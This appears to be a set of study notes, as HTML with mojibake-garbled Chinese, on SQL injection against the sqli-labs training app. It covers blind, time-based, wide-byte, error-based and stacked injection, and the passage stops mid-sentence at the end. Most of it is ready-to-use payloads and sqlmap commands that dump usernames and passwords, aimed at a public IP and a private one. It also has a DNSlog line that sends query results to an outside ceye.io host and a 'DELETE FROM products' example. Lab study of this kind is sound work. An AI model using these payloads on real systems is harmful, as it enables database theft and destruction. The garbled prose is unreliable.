<p>é¶æœºï¼šé¶æœºï¼šsqli-labsç¬¬5å…³</p>
<p>é¡µé¢æ²¡æœ‰æ˜¾ç¤ºï¼Œåªèƒ½é€šè¿‡é¡µé¢è¿”å›æ­£å¸¸ä¸ä¸æ­£å¸¸è¿›è¡Œåˆ¤æ–­</p>
<h6 id="æ‰‹å·¥æ³¨å…¥å®ç°">æ‰‹å·¥æ³¨å…¥å®ç°ï¼š</h6>
<p>1æŸ¥çœ‹é¡µé¢å˜åŒ–ï¼Œåˆ¤æ–­sqlæ³¨å…¥ç±»å‹</p>
<pre><code class="language-sql">?id=1 and 1=1
?id=1 and 1=2
ã€å­—ç¬¦å‹ã€‘
</code></pre>
<p>2ã€çŒœæ•°æ®åº“é•¿åº¦</p>
<p>ä½¿ç”¨lengthï¼ˆï¼‰åˆ¤æ–­æ•°æ®åº“é•¿åº¦ï¼Œé‡‡ç”¨äºŒåˆ†æ³•</p>
<pre><code class="language-sql">?id=1' and length(database())&gt;5 --+
?id=1' and length(database())&lt;10 --+
?id=1' and length(database())=8 --+
ã€length=8ã€‘
</code></pre>
<p>3ã€çŒœå½“å‰è£¤å</p>
<p><strong>æ–¹æ³•1ï¼šé‡‡ç”¨substrå‡½æ•°</strong></p>
<pre><code class="language-sql">?id=1' and substr(database(),1,1)&gt;'r'--+ ?id=1' and substr(database(),1,1)&lt;'t'--+ ?id=1' and substr(database(),1,1)='s'--+ ?id=1' and substr(database(),2,1)='e'--+ ... ?id=1' and substr(database(),8,1)='y'--+ 
--ã€securityã€‘
</code></pre>
<p><strong>æ–¹æ³•2ï¼šä½¿ç”¨<code>asciiå‡½æ•°å’Œsubstrå‡½æ•°</code></strong></p>
<pre><code class="language-sql">?id=1' and ascii(substr(database(),1,1))&gt;114 --+ ?id=1' and ascii(substr(database(),1,1))&lt;116 --+ ?id=1' and ascii(substr(database(),1,1))=115 --+ 
--ã€securityã€‘
</code></pre>
<p><strong>æ–¹æ³•3ï¼šä½¿ç”¨leftå‡½æ•°</strong></p>
<pre><code class="language-sql">?id=1' and left(database(),1)&gt;'r'--+ ?id=1' and left(database(),1)&lt;'t'--+ ?id=1' and left(database(),1)='s' --+ ?id=1' and left(database(),2)='se' --+ ?id=1' and left(database(),3)='sec' --+ ... ?id=1' and left(database(),8)='security' --+ 
--ã€securityã€‘

</code></pre>
<p><strong>æ–¹æ³•å››ï¼šä½¿ç”¨burp</strong></p>
<figure data-type="image" tabindex="2"><img src="./images/%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%5Cburp-sql.jpg" alt="4" loading="lazy"></figure>
<p>4.åˆ¤æ–­è¡¨ä¸ªæ•°</p>
<p>count()å‡½æ•°æ˜¯ç”¨æ¥ç»Ÿè®¡è¡¨ä¸­è®°å½•çš„ä¸€ä¸ªå‡½æ•°ï¼Œè¿”å›åŒ¹é…æ¡ä»¶çš„è¡Œæ•°ã€‚</p>
<pre><code class="language-sql">?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())&gt;0 --+ 
?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+ 
--ã€4ä¸ªè¡¨ã€‘
</code></pre>
<p>5ã€åˆ¤æ–­è¡¨çš„é•¿åº¦</p>
<p>limitå¯ä»¥è¢«ç”¨äºå¼ºåˆ¶selectè¯­å¥è¿”å›æŒ‡å®šçš„æ¡æ•°ã€‚</p>
<p>lengthï¼šè·å–æ•°æ®ä¸²çš„é•¿åº¦</p>
<pre><code class="language-sql">?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+ 
--ã€ç¬¬ä¸€ä¸ªè¡¨é•¿åº¦ä¸º6ã€‘ 
?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=8 --+ 
--ã€ç¬¬äºŒä¸ªè¡¨é•¿åº¦ä¸º8ã€‘
</code></pre>
<p>6ã€çŒœè¡¨å</p>
<p>ç”¨substrå‡½æ•°ï¼šæˆªå–å­—ç¬¦ä¸²ï¼Œå¯ä»¥æŒ‡å®šèµ·å§‹ä½ç½®å’Œé•¿åº¦</p>
<pre><code class="language-sql">?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;'d' --+ 
?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;'f' --+ 
?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='e' --+ 

?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),6,1)='s' --+ 

--ã€ç¬¬ä¸€ä¸ªè¡¨åä¸ºemailsã€‘
--å¯ä»¥ç”¨burpè¿›è¡Œè·‘ï¼Œç±»ä¼¼ä¸Šæ–¹
</code></pre>
<p>7ã€çŒœè§£å­—æ®µåå’Œå­—æ®µä¿¡æ¯</p>
<pre><code class="language-sql">#ç¡®å®šå­—æ®µä¸ªæ•° 
?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = 'users')&gt;0 --+ 
?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = 'users')=3 --+ 
ã€å­—æ®µä¸ªæ•°ä¸º3ã€‘ 

#ç¡®å®šå­—æ®µåçš„é•¿åº¦ 
?id=1' and length((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1))&gt;0 --+ 
?id=1' and length((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1))=2 --+
?id=1' and length((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 1,1))=8 --+ 
--ã€ç¬¬ä¸€ä¸ªå­—æ®µé•¿åº¦ä¸º2ï¼Œç¬¬äºŒä¸ªå­—æ®µé•¿åº¦ä¸º8ã€‘ 

#çŒœå­—æ®µå åŒä¸Šä½¿ç”¨burp 
?id=1' and substr((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1),1,1)='i' --+ 
--ã€...id,username,password...ã€‘ 

#ç¡®å®šå­—æ®µæ•°æ®é•¿åº¦ 
?id=1' and length((select username from users limit 0,1))=4 --+ 
--ã€ç¬¬ä¸€ä¸ªå­—æ®µæ•°æ®é•¿åº¦ä¸º4ã€‘ #çŒœè§£å­—æ®µæ•°æ® åŒä¸Šä½¿ç”¨burp 

?id=1' and substr((select username from users limit 0,1),1,1)='d' --+ ?id=1' and ascii(substr((select username from users limit 0,1),1,1))&gt;79 --+ 
--ã€ç¬¬ä¸€ä¸ªusernameæ•°æ®ä¸ºdumbã€‘

</code></pre>
<h6 id="sqlmapå®ç°å¸ƒå°”æ³¨å…¥">sqlmapå®ç°å¸ƒå°”æ³¨å…¥</h6>
<p>ç”¨åˆ°å‚æ•°</p>
<pre><code>--batch: ç”¨æ­¤å‚æ•°ï¼Œä¸éœ€è¦ç”¨æˆ·è¾“å…¥ï¼Œå°†ä¼šä½¿ç”¨sqlmapæç¤ºçš„é»˜è®¤å€¼ä¸€ç›´è¿è¡Œä¸‹å»ã€‚
--technique:é€‰æ‹©æ³¨å…¥æŠ€æœ¯ï¼ŒB:Boolean-based-blind  ï¼ˆå¸ƒå°”å‹ç›²æ³¨ï¼‰
--threads 10 :è®¾ç½®çº¿ç¨‹ä¸º10ï¼Œè¿è¡Œé€Ÿåº¦ä¼šæ›´å¿«
</code></pre>
<pre><code class="language-python">#æŸ¥è¯¢æ•°æ®åº“ #ã€securityã€‘ 
python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B --dbs --batch --threads 10 
        
#è·å–æ•°æ®åº“ä¸­çš„è¡¨ #ã€emailsã€referersã€uagentsã€usersã€‘ 
python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security --tables --batch --threads 10 

#è·å–è¡¨ä¸­çš„å­—æ®µå #ã€idã€usernameã€passwordã€‘ 
python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security -T users --columns --batch --threads 10 
        
#è·å–å­—æ®µä¿¡æ¯ #ã€Dumb|Dumbã€dhakkan|dumbo ...ã€‘
python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security -T users -C username,password --dump --batch --threads 10
</code></pre>
<h5 id="æ—¶é—´ç›²æ³¨">æ—¶é—´ç›²æ³¨</h5>
<ul>
<li>é¡µé¢ä¸Šæ²¡æœ‰æ˜¾ç¤ºä½</li>
<li>æ²¡æœ‰è¾“å‡ºæŠ¥é”™è¯­å¥</li>
<li>æ­£ç¡®çš„sqlè¯­å¥å’Œé”™è¯¯çš„sqlè¯­å¥é¡µé¢è¿”å›ä¸€è‡´</li>
</ul>
<h6 id="æ‰‹å·¥å®ç°">æ‰‹å·¥å®ç°ï¼š</h6>
<pre><code class="language-sql">?id=1 
?id=1' 
?id=1&quot; 
#ä¸ç®¡æ€ä¹ˆæ ·éƒ½ä¸æŠ¥é”™ï¼Œä¸ç®¡å¯¹é”™ä¸€ç›´æ˜¾ç¤ºä¸€ä¸ªå›ºå®šçš„é¡µé¢ï¼› 

#åˆ¤æ–­æ³¨å…¥ç‚¹ 
?id=1' and sleep(3)--+ 
#é¡µé¢å“åº”å»¶è¿Ÿï¼Œåˆ¤æ–­å­˜åœ¨æ—¶é—´å»¶è¿Ÿå‹æ³¨å…¥ 

#è·å–æ•°æ®åº“åé•¿åº¦ 
?id=1' and if(length(database())=8,sleep(3),1)--+ 

#è·å–æ•°æ®åº“å 
?id=1' and if(substr(database(),1,1)='s',sleep(3),1)--+
</code></pre>
<p>sqlmapå®ç°</p>
<pre><code class="language-python">#æŸ¥è¯¢æ•°æ®åº“ #ã€securityã€‘ 
sqlmap -u http://192.168.200.120/sql/Less-9/?id=1  --technique T --dbs --batch --threads 10 

#è·å–æ•°æ®åº“ä¸­çš„è¡¨ #ã€emailsã€referersã€uagentsã€usersã€‘ 
sqlmap -u http://192.168.200.120/sql/Less-9/?id=1  --technique T -D security --tables --batch --threads 10 
       
#è·å–è¡¨ä¸­çš„å­—æ®µå #ã€idã€usernameã€passwordã€‘ 
sqlmap -u http://192.168.200.120/sql/Less-9/?id=1  --technique T -D security -T users --columns --batch --threads 10 
        
#è·å–å­—æ®µä¿¡æ¯ ã€Dumb|Dumbã€dhakkan|dumbo ...ã€‘ 
sqlmap -u http://192.168.200.120/sql/Less-9/?id=1  --technique T -D security -T users -C username,password --dump --batch --threads 10
</code></pre>
<h4 id="2-dnslogæ³¨å…¥æœ‰å¾…å­¦ä¹ ">2ã€DNSlogæ³¨å…¥ï¼ˆæœ‰å¾…å­¦ä¹ ï¼‰</h4>
<p>https://www.cnblogs.com/Xy--1/p/12896599.html</p>
<h5 id="åŸºç¡€çŸ¥è¯†">åŸºç¡€çŸ¥è¯†</h5>
<p><strong>ä»€ä¹ˆæ˜¯DNS</strong></p>
<p>DNSçš„å…¨ç§°æ˜¯ <code>Domain Name System</code>ï¼ˆåŸŸåç³»ç»Ÿï¼‰ï¼Œå®ƒå°†åŸŸåè§£æä¸º IPï¼Œä½¿äººæ›´æ–¹ä¾¿åœ°è®¿é—®äº’è”ç½‘ã€‚å½“ç”¨æˆ·è¾“å…¥æŸä¸€ç½‘å€å¦‚<code>www.baidu.com</code>ï¼Œç½‘ç»œä¸Šçš„ DNS æœåŠ¡å™¨ä¼šå°†è¯¥åŸŸåè§£æï¼Œå¹¶æ‰¾åˆ°å¯¹åº”çš„çœŸå®IPï¼š<code>182.61.200.6</code>ï¼Œä½¿ç”¨æˆ·å¯ä»¥è®¿é—®è¿™å°æœåŠ¡å™¨ä¸Šç›¸åº”çš„æœåŠ¡ã€‚</p>
<p><strong>ä»€ä¹ˆæ˜¯DNSlog</strong></p>
<p>DNSlog å°±æ˜¯å­˜å‚¨åœ¨ DNS æœåŠ¡å™¨ä¸Šçš„åŸŸåä¿¡æ¯ï¼Œå®ƒè®°å½•ç€ç”¨æˆ·å¯¹åŸŸåçš„è®¿é—®ä¿¡æ¯ï¼Œç±»ä¼¼æ—¥å¿—æ–‡ä»¶ã€‚SQL ç›²æ³¨ã€å‘½ä»¤æ‰§è¡Œã€SSRF åŠ XSS ç­‰æ”»å‡»è€Œæ— æ³•çœ‹åˆ°å›æ˜¾ç»“æœæ—¶ï¼Œå°±ä¼šç”¨åˆ° DNSlog æŠ€æœ¯ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆç”¨Dnslogç›²æ³¨</strong></p>
<p>å¯¹äºSQLç›²æ³¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¸ƒå°”æˆ–è€…æ—¶é—´ç›²æ³¨è·å–å†…å®¹ï¼Œä½†æ˜¯æ•´ä¸ªè¿‡ç¨‹æ•ˆç‡ä½ï¼Œéœ€è¦å‘é€å¾ˆå¤šçš„è¯·æ±‚è¿›è¡Œåˆ¤æ–­ï¼Œå®¹æ˜“è§¦å‘å®‰å…¨è®¾å¤‡çš„é˜²æŠ¤ï¼Œæœ€åå¯¼è‡´ IP è¢« banï¼ŒDnslog ç›²æ³¨å¯ä»¥å‡å°‘å‘é€çš„è¯·æ±‚ï¼Œç›´æ¥å›æ˜¾æ•°æ®å®ç°æ³¨å…¥ã€‚</p>
<h5 id="åŸç†">åŸç†</h5>
<p>æ”»å‡»è¯­å¥ï¼š</p>
<pre><code class="language-sql">select load_file(concat('\\\\',æ”»å‡»è¯­å¥,'.XXX.ceye.io\\abc'))
</code></pre>
<h4 id="3-å®½å­—èŠ‚æ³¨å…¥">3ã€å®½å­—èŠ‚æ³¨å…¥</h4>
<p><strong>åŸç†</strong>ï¼šå®½å­—èŠ‚æ³¨å…¥æ˜¯åˆ©ç”¨mysqlçš„ä¸€ä¸ªç‰¹æ€§ï¼Œ<code>mysqlåœ¨ä½¿ç”¨GBKç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—</code>ã€å‰ä¸€ä¸ªasciiç è¦å¤§äº<code>128</code>ï¼Œæ‰åˆ°æ±‰å­—çš„èŒƒå›´ã€‘</p>
<p>ç®€å•çš„URLç¼–ç </p>
<table>
<thead>
<tr>
<th>ç©ºæ ¼</th>
<th>%20</th>
</tr>
</thead>
<tbody>
<tr>
<td>'ï¼ˆå•å¼•å·ï¼‰</td>
<td>%27</td>
</tr>
<tr>
<td>#</td>
<td>%23</td>
</tr>
<tr>
<td>\ï¼ˆåæ–œæ ï¼‰</td>
<td>%5C</td>
</tr>
<tr>
<td></td>
<td>%df</td>
</tr>
</tbody>
</table>
<p>å½“è¾“å…¥å•å¼•å·ï¼Œå‡è®¾è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<code>addslashes</code>è½¬ä¹‰ï¼Œå¯¹åº”çš„urlç¼–ç æ˜¯ï¼š<br>
<strong><code>'</code> â€“&gt;<code>\'</code>â€“&gt; <code>%5c%27</code></strong><br>
å½“åœ¨å‰é¢å¼•å…¥ä¸€ä¸ªASCIIå¤§äº128çš„å­—ç¬¦ã€æ¯”å¦‚%dfã€%aaã€‘ï¼Œurlç¼–ç å˜ä¸ºï¼š<br>
<strong><code>%df'</code> â€“&gt; <code>%df\'</code> â€“&gt; <code>(%df%5C)%27</code>â€“&gt;<code>(æ•°æ®åº“GBK)</code>â€“&gt;<code>é‹'</code></strong></p>
<p>å‰ç«¯è¾“å…¥**<code>%df'</code><strong>æ—¶é¦–å…ˆç»è¿‡ä¸Šé¢</strong><code>addslashes</code><strong>å‡½æ•°å’Œæµè§ˆå™¨</strong><code>urlç¼–ç </code><strong>è½¬ä¹‰å˜æˆäº†</strong><code>%df%5c%27</code>**  ï¼Œå•å¼•å· ' = %27æˆåŠŸé€ƒè„±ï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹æ€§ä»è€Œå¯å®æ–½SQLæ³¨å…¥çš„åˆ©ç”¨ã€‚</p>
<h5 id="æ‰‹å·¥æµ‹è¯•">æ‰‹å·¥æµ‹è¯•ï¼š</h5>
<p>æµ‹è¯•ç¯å¢ƒï¼šsql-less-33</p>
<pre><code class="language-sql">1ã€æµ‹è¯•
?id=1
'''
Welcome    Dhakkan
Your Login name:Dumb
Your Password:Dumb
'''
?id=1'
'''Hint: The Query String you input is escaped as : 1 \'
The Query String you input in Hex becomes : 31205c27
'''
--å½“è¾“å…¥ ' è¢«ç¼–æˆäº†\ æ‰€ä»¥æ¨æµ‹åº”è¯¥æ˜¯å‡½æ•°è½¬ä¹‰ï¼šaddslasheså‡½æ•°

?id=1%df'
'''
æˆ–è€…ã€åªè¦ASCIIå¤§äº128çš„å­—ç¬¦å°±å¯ä»¥ã€‘
?id=1%aa'
æ­¤æ—¶ä¼šæŠ¥é”™
'''

2ã€ç¡®å®šå­—æ®µ
?id=1%df' order by 4 --+          
'''
è¾“å…¥3 æ­£å¸¸ï¼Œbut4ä¸æ­£å¸¸äº†ï¼Œæ‰€ä»¥åˆ¤æ–­å­—æ®µæ•°ä¸º3
'''

3ã€ç¡®å®šæ˜¾ç¤ºä½
?id=-1%aa' union select 1,2,3--+
'''
Welcome    Dhakkan
Your Login name:2
Your Password:3
'''
--ç¡®å®šäº†å›æ˜¾ä½ç½®æ˜¯ 2  3

4ã€æŸ¥è¯¢ä¿¡æ¯
#æŸ¥è¯¢æ•°æ®åº“
?id=-1%aa' union select 1,2,database() --+
'''
Welcome    Dhakkan
Your Login name:2
Your Password:security
'''
--å¾—åˆ°æ•°æ®åº“æ˜¯security

#æŸ¥è¯¢è¡¨å
?id=-1%aa' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()  --+
'''
Welcome    Dhakkan
Your Login name:2
Your Password:emails,referers,uagents,users
'''

#æŸ¥è¯¢å­—æ®µå
?id=-1%aa' union select 1, 2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273  --+
'''
Welcome    Dhakkan
Your Login name:2
Your Password:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password,level,id,username,password
'''
--è¿™é‡Œè¡¨åtable_nameçš„å€¼å¿…é¡»è½¬æ¢æˆ16è¿›åˆ¶ï¼Œå¦‚æœä¸ç”¨16è¿›åˆ¶å°±å¾—ç”¨å¼•å·åŒ…è£¹ï¼Œå½“æœ‰addlasheså‡½æ•°å°±ä¼šè½¬ä¹‰å¼•å·ï¼Œå°±ä¼šå¯¼è‡´æŸ¥è¯¢å¤±è´¥ï¼Œä½¿ç”¨16è¿›åˆ¶é¿å…äº†è¿™ä¸ªé—®é¢˜ã€‚

#æŸ¥è¯¢å­—æ®µä¿¡æ¯
---å¾…æ›´æ–°
?id=-1%aa' union select 1,group_concat(username),group_concat(password) from users  --+
'''
Welcome    Dhakkan
Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 
'''

</code></pre>
<p><strong>å¾…æ›´æ–°</strong></p>
<h5 id="ä½¿ç”¨sqlmap">ä½¿ç”¨sqlmapï¼š</h5>
<h4 id="4-æŠ¥é”™æ³¨å…¥éœ€è¦è¡¥å……">4ã€æŠ¥é”™æ³¨å…¥ï¼ˆéœ€è¦è¡¥å……ï¼‰</h4>
<h5 id="flooræŠ¥é”™æ³¨å…¥åŒæŸ¥è¯¢æ³¨å…¥">flooræŠ¥é”™æ³¨å…¥/åŒæŸ¥è¯¢æ³¨å…¥</h5>
<p>åŒæŸ¥è¯¢æŠ¥é”™/flooræŠ¥é”™æ³¨å…¥æ˜¯ç”±äº<code>rand()</code>ï¼Œ<code>count()</code>ï¼Œ<code>group by</code> ï¼Œ<code>floor</code>å››ä¸ªè¯­å¥è”åˆä½¿ç”¨é€ æˆçš„ï¼Œç¼ºä¸€ä¸å¯ã€‚</p>
<p>ä¸€äº›ç ”ç©¶äººå‘˜å‘ç°ï¼Œä½¿ç”¨<code>group by</code>å­å¥ç»“åˆ<code>rand()</code>å‡½æ•°ä»¥åŠåƒ<code>countï¼ˆ*ï¼‰</code>è¿™æ ·çš„èšåˆå‡½æ•°ï¼Œåœ¨SQLæŸ¥è¯¢æ—¶ä¼šå‡ºç°é”™è¯¯ï¼Œè¿™ç§é”™è¯¯æ˜¯éšæœºäº§ç”Ÿçš„ï¼Œè¿™å°±äº§ç”Ÿäº†åŒé‡æŸ¥è¯¢/flooræŠ¥é”™æ³¨å…¥ã€‚ä½¿ç”¨<code>floor()</code>å‡½æ•°åªæ˜¯ä¸ºäº†å°†æŸ¥è¯¢ç»“æœåˆ†ç±»</p>
<p>éœ€ç”¨åˆ°å››ä¸ªå‡½æ•°å’Œä¸€ä¸ª<code>group by</code>è¯­å¥ï¼š</p>
<ol>
<li><code>group by ...</code> â€”&gt;åˆ†ç»„è¯­å¥ //å°†æŸ¥è¯¢çš„ç»“æœåˆ†ç±»æ±‡æ€»</li>
<li><code>rand()</code> â€”&gt;åœ¨0-1ä¹‹é—´éšæœºæ•°ç”Ÿæˆå‡½æ•°</li>
<li><code>floor()</code> â€”&gt;å–æ•´å‡½æ•° //ç”¨æ¥å¯¹ç”Ÿæˆçš„éšæœºæ•°å–æ•´</li>
<li><code>concat()</code>ã€ <code>concat_ws()</code>â€”&gt;è¿æ¥å­—ç¬¦ä¸²</li>
<li><code>count()</code> â€”&gt;ç»Ÿè®¡å‡½æ•° //ç»“åˆgroup byè¯­å¥ç»Ÿè®¡åˆ†ç»„åçš„æ•°æ®</li>
</ol>
<p>å­æŸ¥è¯¢ï¼šå†…éƒ¨æŸ¥è¯¢ã€ç®€å•ç†è§£ï¼Œselectä¸­åµŒå¥—ä¸€ä¸ªselectæŸ¥è¯¢</p>
<pre><code class="language-sql">select concat(&quot;-&quot;,(select database()));
</code></pre>
<p><strong>flooræŠ¥é”™æ³¨å…¥ï¼š</strong></p>
<pre><code class="language-sql">?id=-1' union select 1,count(*), concat((select database()), floor(rand(1)*2))as a from information_schema.tables group by a --+
</code></pre>
<p>å› ä¸ºrandçš„éšæœºæ€§ï¼šæ‰€ä»¥æˆ‘ä»¬æ¯æ¬¡ä¸ä¸€å®šéƒ½å¯ä»¥çœ‹åˆ°æ­£å¸¸é¡µé¢ï¼Œå½“æˆ‘ä»¬åŠ ä¸Š1ä¹‹åï¼Œå°±iå¯ä»¥äº†</p>
<p><strong>åŒæŸ¥è¯¢æ³¨å…¥</strong></p>
<p>å½“group by åœ¨æŸ¥è¯¢è™šæ‹Ÿè¡¨å’Œæ’å…¥è™šæ‹Ÿè¡¨æ—¶ï¼Œå¦‚æœè¿™ä¸¤æ¬¡aè¯­å¥æ‰§è¡Œçš„ç»“æœä¸ä¸€è‡´å°±ä¼šå¼•å‘é”™è¯¯ï¼Œé”™è¯¯æç¤ºä¿¡æ¯æ˜¯æ’å…¥çš„ä¸»é”®é‡å¤ï¼Œé€šè¿‡è‡ªå®šä¹‰æç¤ºé‡ŒæŠ¥é”™ä¿¡æ¯ä¸­çš„ä¸»é”®å€¼æ¥è·å¾—æ•æ„Ÿä¿¡æ¯ã€‚</p>
<p><strong>payloads</strong></p>
<pre><code class="language-sql">#è·å–æ•°æ®åº“å 
?id=-1' union select 1,count(*),concat_ws('-',(select database()),floor(rand(0)*2))as a from information_schema.tables group by a--+ 
æˆ–è€… 
?id=1' and (select 1 from (select count(*),concat('~',database(),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a) --+ 

#è·å–è¡¨å 
?id=-1' union select 1,count(*),concat_ws('-',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand()*2))as a from information_schema.tables group by a--+ 
æˆ–è€… 
?id=1'and (select 1 from (select count(*),concat('~',(select table_name from information_schema.tables where table_schema = database() limit 0,1),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a) --+

</code></pre>
<h5 id="updatexmlæŠ¥é”™æ³¨å…¥">updatexmlæŠ¥é”™æ³¨å…¥</h5>
<pre><code class="language-sql">updatexml(xml_target, XPath_string, new_value)ï¼šè¿”å›æ›¿æ¢çš„XMLç‰‡æ®µ
</code></pre>
<table>
<thead>
<tr>
<th style="text-align:left">å‚æ•°</th>
<th style="text-align:left">æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">XML_document</td>
<td style="text-align:left">Stringæ ¼å¼ï¼Œéœ€è¦æ“ä½œçš„xmlç‰‡æ®µ</td>
</tr>
<tr>
<td style="text-align:left">XPath_string</td>
<td style="text-align:left">éœ€è¦æ›´æ–°çš„xmlè·¯å¾„(Xpathæ ¼å¼)</td>
</tr>
<tr>
<td style="text-align:left">new_value</td>
<td style="text-align:left">Stringæ ¼å¼ï¼Œæ›´æ–°åçš„å†…å®¹</td>
</tr>
</tbody>
</table>
<p>payload</p>
<pre><code class="language-sql">çˆ†æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯
?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)

é“¾æ¥ç”¨æˆ·
?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)

é“¾æ¥æ•°æ®åº“
?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)

çˆ†åº“
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)

çˆ†è¡¨
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)

çˆ†å­—æ®µ
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)

çˆ†å­—æ®µå†…å®¹
?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)

çˆ†è¡¨å
?id=1 and updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#
çˆ†åˆ—å
?id=1 and updatexml(1,make_set(3,'~',(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;)),1)#
çˆ†å­—æ®µ
?id=1 and updatexml(1,make_set(3,'~',(select data from users)),1)#
</code></pre>
<h5 id="extractvalueæŠ¥é”™æ³¨å…¥">extractvalueæŠ¥é”™æ³¨å…¥</h5>
<p><code>extractvalue(xml_frag, xpath_expr)</code>ï¼šä½¿ç”¨XPathè¡¨ç¤ºæ³•ä»XMLå­—ç¬¦ä¸²ä¸­æå–å€¼</p>
<table>
<thead>
<tr>
<th style="text-align:left">å‚æ•°</th>
<th style="text-align:left">æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">xml_frag</td>
<td style="text-align:left">ç›®æ ‡xmlæ–‡æ¡£</td>
</tr>
<tr>
<td style="text-align:left">xpath_expr</td>
<td style="text-align:left">Xpathæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œxmlè·¯å¾„</td>
</tr>
</tbody>
</table>
<p>payload</p>
<pre><code class="language-sql">extractvalue(1,concat(0x7e,(select database()),0x7e));
</code></pre>
<p>å¦‚æœXpathæ ¼å¼è¯­æ³•ä¹¦å†™é”™è¯¯çš„è¯ï¼Œå°±ä¼šæŠ¥é”™ã€‚åˆ©ç”¨concatå‡½æ•°å°†æƒ³è¦è·å¾—çš„æ•°æ®åº“å†…å®¹æ‹¼æ¥åˆ°ç¬¬äºŒä¸ªå‚æ•°ä¸­ï¼ŒæŠ¥é”™æ—¶ä½œä¸ºå†…å®¹è¾“å‡º</p>
<h4 id="5-äºŒæ¬¡æ³¨å…¥">5ã€äºŒæ¬¡æ³¨å…¥</h4>
<h5 id="æœ‰å¾…å­¦ä¹ -">æœ‰å¾…å­¦ä¹ --=</h5>
<h4 id="6-å †å æ³¨å…¥">6ã€å †å æ³¨å…¥</h4>
<p>åŸç†ï¼šåœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äºunion æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚ç”¨æˆ·è¾“å…¥ï¼š1; DELETE FROM productsæœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼šï¼ˆå› æœªå¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼‰Select * from products where productid=1;DELETE FROM 